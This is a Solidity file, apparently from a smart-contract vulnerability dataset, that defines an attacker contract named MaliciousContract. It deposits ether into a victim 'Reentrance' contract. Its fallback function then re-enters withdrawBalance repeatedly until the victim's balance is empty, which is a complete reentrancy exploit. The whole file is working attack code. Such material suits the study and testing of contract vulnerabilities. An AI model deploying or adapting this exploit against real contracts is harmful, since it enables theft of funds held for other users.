pragma solidity ^0.4.15;

import "../dataset/reentrancy/reentrancy_simple.sol";

contract MaliciousContract {
    Reentrance reentrance;

    constructor(address _victimAddress) public {
        reentrance = Reentrance(_victimAddress);
    }

    function attack() public {
        reentrance.withdrawBalance();
    }

    function deposit() public payable {
        require(msg.value >= 1);
        reentrance.addToBalance.value(msg.value)();
    }

    function() external payable {
        // Re-enter the vulnerable function if there's still balance to collect
        if (address(reentrance).balance > 0) {
            reentrance.withdrawBalance();
        }
    }
}
